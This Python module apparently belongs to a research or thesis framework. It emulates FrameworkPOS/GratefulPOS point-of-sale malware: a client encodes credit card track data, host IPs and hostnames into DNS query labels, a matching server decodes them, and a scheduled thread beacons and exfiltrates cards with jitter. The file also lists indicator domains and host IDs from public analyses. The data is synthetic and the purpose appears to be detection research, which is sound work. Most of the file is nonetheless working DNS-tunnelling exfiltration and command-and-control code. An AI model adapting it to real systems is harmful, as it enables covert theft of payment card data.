import random
import string
import sys
from collections import namedtuple
from time import sleep
from typing import Tuple

from dnslib import DNSRecord, RR, QTYPE, A

from data.creditcard.ccgen import CreditCardGenerator
from malware import base, schedules
from malware.helper import jitter, DEBUGGERS_SANDBOXES, HEX_CHARS, delta_to_next_hour
from util import info, ok
from .encoding import encode_label, decode_label


class Client(base.Client):
    """
    Exfils track1/track2 card data with extended campaign capabiliies.

    Sources:
        https://labs.sentinelone.com/fin6-frameworkpos-point-of-sale-malware-analysis-internals-2/
        https://www.anomali.com/blog/three-month-frameworkpos-malware-campaign-nabs-43000-credits-cards-from-poi
        https://www.mysonicwall.com/sonicalert/searchresults.aspx?ev=article&id=904
        https://community.rsa.com/community/products/netwitness/blog/2017/12/08/gratefulpos-credit-card-stealing-malware-just-in-time-for-the-shopping-season#_edn3

    Communicates with 8.8.8.8 ->
    https://community.rsa.com/community/products/netwitness/blog/2017/12/08/gratefulpos-credit-card-stealing-malware-just-in-time-for-the-shopping-season#_edn4

    Schedule: UNKNOWN
    Maybe of interest: The POS malware then sleeps randomly for the period of between 2 hours and 3 hours. (vkremez)
    """

    # domains = [
    #     # labs.sentinelone.com
    #     "ns.akamai1811[.]com",
    #
    #     # labs.sentinelone.com, https://www.virustotal.com/gui/url/bade0f9a33fb15e7759091bd24150b767ca53a7e233c16345021f4442fdf1cc7/details
    #     "ns.a193-45-3-47-deploy-akamaitechnologies[.]com",
    #
    #     # anomali.com
    #     # https://www.virustotal.com/gui/file/98ee47f6ead4dc2e908d3d2a6c0df3c3bb238c4737434d2568347786645a7b00/behavior/Tencent%20HABO
    #     # https://www.virustotal.com/gui/file/81cea9fe7cfe36e9f0f53489411ec10ddd5780dc1813ab19d26d2b7724ff3b38/behavior/Tencent%20HABO
    #     "ns.a23-33-37-54-deploy-akamaitechnologies[.]com",
    #
    #     # anomali.com
    #     "ns.a203-111-15-229-deploy-akamaitechnologies[.]com",
    #     "ns.a23-60-69-126-deploy-akamaitechnologies[.]com",
    #
    #     # community.rsa.com
    #     "ns.a193-108-94-56-deploy-akamaitechnologies.com",
    # ]

    host_ids = [
        "807ab272",  # hybrid-analysis.com
        "09ad9ca2",  # anomali.com
        "36e517f3",  # anomali.com
        "e5f007f2",  # mysonicwall.com

        # https://www.virustotal.com/gui/file/98ee47f6ead4dc2e908d3d2a6c0df3c3bb238c4737434d2568347786645a7b00/behavior/Tencent%20HABO
        "1400d20a",
        "9290c3a2",
        "8430936f",

        # https://www.virustotal.com/gui/file/81cea9fe7cfe36e9f0f53489411ec10ddd5780dc1813ab19d26d2b7724ff3b38/relations
        "6ac006a0",

        # https://www.virustotal.com/gui/domain/a193-108-94-56-deploy-akamaitechnologies.com/relations
        "458bba19",
        "87adf69d",
        "efbd479d",
        "35cbbb43",
        "7b2fe96a",

        # https://www.virustotal.com/gui/file/3f553f9731b26e0e0909314b7eff893c558381da6fb00c8221bf31a866a414a9/behavior/Tencent%20HABO
        "7f5fef6e",
        "0cd1923b",
        "31403ba1",
        "4ba1876d",
        "f45f54d5",

        # https://www.hybrid-analysis.com/sample/5540b8d51f2190c45aaa5212c866c402f834d5988752537c388dcfecdf89f4e4?environmentId=120
        "3e15690b",

        # https://www.hybrid-analysis.com/sample/81cea9fe7cfe36e9f0f53489411ec10ddd5780dc1813ab19d26d2b7724ff3b38?environmentId=100
        "807ab272"
    ]

    groups = [
        # https://www.virustotal.com/gui/file/81cea9fe7cfe36e9f0f53489411ec10ddd5780dc1813ab19d26d2b7724ff3b38/behavior/Tencent%20HABO
        "grp1",

        # https://www.vkremez.com/2017/12/lets-learn-reversing-grateful-point-of.html
        "grp2",
        "grp02",

        # anomali.com
        "grp03",
        "grp05",

        # anomali.com, mysonicwall.com
        "grp10",

        # community.rsa.com
        "v1702",

        # https://www.virustotal.com/gui/domain/a193-108-94-56-deploy-akamaitechnologies.com/relations
        "v1705"
    ]

    def __init__(self, hostname: str, local_ip: str, external_ip: str, is_admin: bool, group: str = None,
                 domain: str = None, host_id: str = None):
        self.hostname = hostname
        self.local_ip = local_ip
        self.external_ip = external_ip
        self.is_admin = is_admin

        self.group = group if group is not None else random.choice(self.groups)
        self.domain = domain if domain is not None else "frameworkpos.lan"
        self.host_id = host_id if host_id is not None else ''.join(random.choices(HEX_CHARS, k=8))

    def collect(self):
        """
        Then, the POS malware scans memory regions via ReadProcessMemory API looking for Track 1 and Track 2 data and writing and appending it to the ".dat" file as "tt1.%s.%s.%s.%s" Track 1 data and "tt2.%s.%s" Track 2 data if the matched length is 140 and 60 characters, respectively. The malware also checks if it can reach the server and after several attempts it deletes the stolen data. Additionally, GratefulPOS appends "notice" to the same file to mark debugger output.
        The observed structure of the submitted requests data is as follows:
        [HOST_ID].grp1.ping.[ADMIN].[LOCAL_IP].[LOCAL_USERNAME].ns[.]a193-45-3-47-deploy-akamaitechnologies.com
        [HOST_ID].grp1.notice.[PROCESS_ATTACHED].ns[.]a193-45-3-47-deploy-akamaitechnologies.com
        [HOST_ID].grp1.tt1.[TRACK1_INFORMATION].ns[.]a193-45-3-47-deploy-akamaitechnologies.com
        [HOST_ID].grp1.tt2.[TRACK2_INFORMATION].ns[.]a193-45-3-47-deploy-akamaitechnologies.com
        """
        pass

    def ping(self):
        return ".".join([
            self.host_id, self.group,
            "ping",
            "adm" if self.is_admin else "nadm",
            encode_label(self.local_ip),
            encode_label(self.external_ip),
            encode_label(self.hostname),
            self.domain
        ])

    def track1(self, card: str):
        """
        Example (https://www.anomali.com/blog/three-month-frameworkpos-malware-campaign-nabs-43000-credits-cards-from-poi):
        encoded: prefix.tt1.dcd2fed0d2fefecdc8d2c4c8c8fecdde.e3e29f9a9ff9cbc79fdae3fcc4d2c8c4cdd0feded295e9e9e9e9e9e9feea.e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9.e9e9e9e9e9e9e9e9e9e9.domain.tld
        decoded prefix.tt1.4936789994171949.^MelissaJordan^340332388..B67.67497093623419^YasirPollard^97.106268827.domain.tld
        """

        # Split at first separator (strip first 'B' from pan)
        pan, remainder = card[1:].split('^', maxsplit=1)

        # split remainder at 30 chars and fill both until 30 characters long
        data1 = f"{remainder[:30]:<30}"
        data2 = f"{remainder[30:]:<30}"

        # Final label contents unknown, either empty or a sequence of numbers, length 10
        if random.choice((True, False)):
            data3 = " " * 10
        else:
            data3 = ''.join(random.choices(string.digits, k=10))

        return ".".join([
            self.host_id, self.group,
            "tt1",
            encode_label(pan), encode_label(data1), encode_label(data2), encode_label(data3),
            self.domain
        ])

    def track2(self, card: str):
        """
        Example (https://www.anomali.com/blog/three-month-frameworkpos-malware-campaign-nabs-43000-credits-cards-from-poi):

        prefix.tt2.dcc8c8d0c8fccdd2fcd0dcdec8c8cdc8.e6dcc8c8d0c8fccdd2fcd0dcdec8c8cdc8e9dcdcdec8ded2feded0d2c8fc .domain.tld
        decoded: prefix.tt2.[4556571076485515].[=4556571076485515.448580286057].domain.tld
        """

        # Split card on separator (remove control characters ; and ?3)
        pan, remainder = card[1:-2].split('=', maxsplit=1)

        # rfill remainder with random numbers or dots
        remainder = remainder[:30]
        rfill_len = 30 - len(remainder)
        if random.choice((True, False)):
            rfill = "." * rfill_len
        else:
            rfill = ''.join(random.choices(string.digits, k=rfill_len))

        return ".".join([
            self.host_id, self.group,
            "tt2",
            encode_label(pan), encode_label(remainder + rfill),
            self.domain
        ])

    def notice(self, process: str):
        """
        Example (https://www.anomali.com/blog/three-month-frameworkpos-malware-campaign-nabs-43000-credits-cards-from-poi):

        36e517f3.grp10.notice.c1cbcbdac7c0c2e9f9ccf9.ns.a23-33-37-54-deploy-akamaitechnologies.com
        decoded: prefix.notice. [ollydbg.exe] .domain.tld
        """

        return ".".join([
            self.host_id, self.group,
            "notice",
            encode_label(process),
            self.domain
        ])

    def __str__(self):
        return '%s(%s)' % (type(self).__name__, ', '.join('%s=%s' % item for item in vars(self).items()))


class Server(base.Server):
    Ping = namedtuple('Ping', ['host_id', 'group_id', 'is_admin', 'local_ip', 'external_ip', 'hostname'])
    Track1 = namedtuple('Track1', ['host_id', 'group_id', 'cc_num', 'data1', 'data2', 'data3'])
    Track2 = namedtuple('Track2', ['host_id', 'group_id', 'cc_num', 'data'])
    Notice = namedtuple('Notice', ['host_id', 'group_id', 'process'])

    def __init__(self, domain: str, server_ip: str, log_dir: str, external_client_ip: str):
        super().__init__(domain, server_ip, log_dir)
        self.external_client_ip = external_client_ip

    def receive(self, record: DNSRecord) -> DNSRecord:
        """
        Format: [bot-id].[campaign-id].[command].[encoded data].[encoded data].[encoded data].[domain].[tld]
        """

        question = record.get_q()

        # Get payload from query
        payload = self.get_payload(question)
        if payload is not False:
            self.process(payload)

            # Respond
            reply = record.reply()
            reply.add_answer(RR(question.get_qname(), QTYPE.A, rdata=A(self.external_client_ip), ttl=3600))
            return reply

        else:
            info(f"[FrameworkPOS] Server: Ignoring query for other domain: {question.qname}")

    def process_payload(self, payload: str):

        # Split labels
        labels = payload.split(".")

        host_id = labels[0]
        grp_id = labels[1]
        command = labels[2]

        # Decode payload based on command
        if command == "ping":
            return self.Ping(
                host_id, grp_id,
                is_admin=labels[3] == 'adm',
                local_ip=decode_label(labels[4]),
                external_ip=decode_label(labels[5]),
                hostname=decode_label(labels[6])
            )

        elif command == "tt1":
            return self.Track1(
                host_id, grp_id,
                cc_num=decode_label(labels[3]),
                data1=decode_label(labels[4]),
                data2=decode_label(labels[5]),
                data3=decode_label(labels[6]),
            )

        elif command == "tt2":
            return self.Track2(
                host_id, grp_id,
                cc_num=decode_label(labels[3]),
                data=decode_label(labels[4])
            )

        elif command == "notice":
            return self.Notice(
                host_id, grp_id,
                decode_label(labels[3])
            )


class Exfiltration(base.ExfiltrationThread):
    """
        Schedule: UNKNOWN
        Best guess:
        grp05	22,202	21,525	2015-08-09	2016-02-07	4	4	ALOHABOH,ALOHABOH2
        So, ~44,000 cards stolen in 182 days from four devices

        ALOHABOH belongs probably to a restaurant POS system. So, most transactions from 17:00 till 0:00 with peak at 22:00.

        44,000 in 6 months == 242 per day
        35 cards per hour (on average) == .59 cards per second
        == .15 cards per second per venue
        """

    def __init__(self, client: Client, dns_settings: Tuple[str, int], log_dir: str, schedule: schedules.TypeB,
                 data_source: CreditCardGenerator = None):

        super().__init__(client, dns_settings, log_dir)
        self.schedule = schedule
        self.unlimited_credit_cards = data_source or CreditCardGenerator()

    def run(self):
        info("[FrameworkPOS] Started exfil thread.")

        # Send notice for a random debugger
        self.dns_query(self.client.notice(random.choice(DEBUGGERS_SANDBOXES)))
        info(f"[FrameworkPOS] Sending notice (running in debug environment).")
        sleep(1)

        # Send ping
        self.dns_query(self.client.ping())
        info(f"[FrameworkPOS] Sending ping (install beacon).")
        sleep(5)

        last_hour = -1

        while True:
            current_hour, intv = self.schedule.get_interval()

            # No cards this hour
            if intv is None:
                # Sleep until next hour when there are no cards to exfiltrate
                sleep_time = max(1, delta_to_next_hour())

                info(f"[FrameworkPOS] No cards to exfiltrate this hour ({current_hour}:00).")
                info(f"[FrameworkPOS] Sleeping {sleep_time} seconds ({sleep_time / 60:.1f} minutes).")

                sleep(sleep_time)
                continue

            # Actual exfiltration here!
            if last_hour != current_hour:
                last_hour = current_hour
                info(f"[FrameworkPOS] Exfiltrating one card every {intv:.2f} seconds this hour ({current_hour}:00).")

            card, track_type = next(self.unlimited_credit_cards) or (ok("Exfil complete!") and sys.exit(0))

            if track_type == 1:
                query = self.client.track1(card)
            elif track_type == 2:
                query = self.client.track2(card)
            else:
                raise ValueError(f"[FrameworkPOS] Invalid credit card track type found ({track_type})")

            self.analytics(1)
            info(self.print_debug("FrameworkPOS", 1))

            # Create DNSRecord and send!
            self.dns_query(query, 'A')

            # Sleep for interval (plus or minus 5% jitter)
            sleep(jitter(intv, jitter_range=.05))


def smoke_test():
    cc1 = CreditCardGenerator(1)
    cc2 = CreditCardGenerator(2)

    client = Client("THESIS", "10.0.0.10", "255.255.255.255", True, "grp00", domain=None, host_id=None)
    # ping = client.ping()
    tt1 = client.track1(next(cc1)[0])
    tt2 = client.track2(next(cc2)[0])
    # notice = client.notice("SANDBOX.exe")

    # print(tt1)
    # print(tt2)

    print(Server("fpos.lan").receive(
        "8cabca96.grp1.tt1.dce8fcdcfedcded0dcdcdecddcc4fcfc.9b97eced97fae7ecf0c3f2f29dce99e9e9e9e9e9e9e9e9e9e9e9e9e9e3cd.d2fefec4fee8fec8fed2c8c8c4dee8cddee8c4d2dcc4c8d0defededcfcd095.e9e9e9e9e9e9e9e9e9e9.domain.com"))

    # print(FrameworkPOS.receive(
    #     "6ac006a0.grp1.ping.adm.cdcdd2e9cdcdd2e9cdcdd2e9cde8d0.d2e9d2e9d2e9d2.c39ec3edfaecf0d287fe99cdd0fccd.ns.a193-45-3-47-deploy-akamaitechnologies.com"))
    # print(Server.receive(
    #     "6ac006a0.grp1.ping.adm.cdcdd2e9cdcdd2e9cdcdd2e9cde8de.d2e9d2e9d2e9d2.c39ec3edfaecf0d287fe99cdd0fccd.ns.a193-45-3-47-deploy-akamaitechnologies.com"))
    # print(Server.receive(
    #     "6ac006a0.grp1.ping.adm.cdcdd2e9cdcdd2e9cdcdd2e9fedcd2.d2e9d2e9d2e9d2.c39ec3edfaecf0d287fe99cdd0fccd.ns.a193-45-3-47-deploy-akamaitechnologies.com"))
    # print(Server.receive(""))

    #
    # print(tt1)
    #
    # print(Server.receive(
    #     "09ad9ca2.grp10.tt1.dcd2fed0d2fefecdc8d2c4c8c8fecdde.e3e29f9a9ff9cbc79fdae3fcc4d2c8c4cdd0feded295e9e9e9e9e9e9feea.e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9.e9e9e9e9e9e9e9e9e9e9.ns.a23-33-37-54-deploy-akamaitechnologies.com"))
    # print(Server.receive(
    #     "09ad9ca2.grp10.tt2.dcc8c8d0c8fccdd2fcd0dcdec8c8cdc8.e6dcc8c8d0c8fccdd2fcd0dcdec8c8cdc8e9dcdcdec8ded2feded0d2c8fc.ns.a23-33-37-54-deploy-akamaitechnologies.com"))

    # print(Server.receive(ping))
    # print(Server.receive(tt1))
    # print(Server.receive(tt2))
    # print(Server.receive(notice))

    # # https://community.rsa.com/community/products/netwitness/blog/2017/12/08/gratefulpos-credit-card-stealing-malware-just-in-time-for-the-shopping-season#_edn4
    # print(FrameworkPOS.receive(
    #     "93c61f10.v1702.ping.adm.cdd2e9cde8e8e9cde8e8e9fec4fc.fcfee9fec4c8e9cdc4cde9fefec4.c59dec87ed9dd8d8fa.ns.a193-108-94-56-deploy-akamaitechnologies.com"))
    #
    # # https://www.hybrid-analysis.com/sample/5540b8d51f2190c45aaa5212c866c402f834d5988752537c388dcfecdf89f4e4?environmentId=120
    # print("Real requests:")
    # print(Server.receive(
    #     "3e15690b.v1702.ping.adm.cde8fee9cdd0dee9c8d0e9cdc8fe.cde8c4e9fcd2e9dcfce9fed2d2.e1c3c5c6d89bec87c5d3.ns.a193-108-94-56-deploy-akamaitechnologies.com"))
    # print(Server.receive(
    #     "3e15690b.v1702.notice.c4f6c3c9ddc1fdddc4e9f9ccf9.ns.a193-108-94-56-deploy-akamaitechnologies.com"))
    # print(Server.receive(
    #     "3e15690b.v1702.tt2.dcd2d0d2c4fed2c4dcdcc4fcd2c8c8fc.e6fed2d2c4fed2cdd2d2d2d2d2d0ded0d2d2d2d2d2e9e9e9e9e9e9e9e9e9.ns.a193-108-94-56-deploy-akamaitechnologies.com"))
    # #
    # print(FrameworkPOS.receive(
    #     "09ad9ca2.grp10.tt1.dcd2fed0d2fefecdc8d2c4c8c8fecdde.e3e29f9a9ff9cbc79fdae3fcc4d2c8c4cdd0feded295e9e9e9e9e9e9feea.e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9e9.e9e9e9e9e9e9e9e9e9e9.ns.a23-33-37-54-deploy-akamaitechnologies.com"))

    # print(Server.receive(
    #     "3e15690b.v1702.tt2.dcd2d0d2c4fed2c4dcdcc4fcd2c8c8fc.e6fed2d2c4fed2cdd2d2d2d2d2d0ded0d2d2d2d2d2e9e9e9e9e9e9e9e9e9.ns.a193-108-94-56-deploy-akamaitechnologies.com"))


if __name__ == "__main__":
    smoke_test()
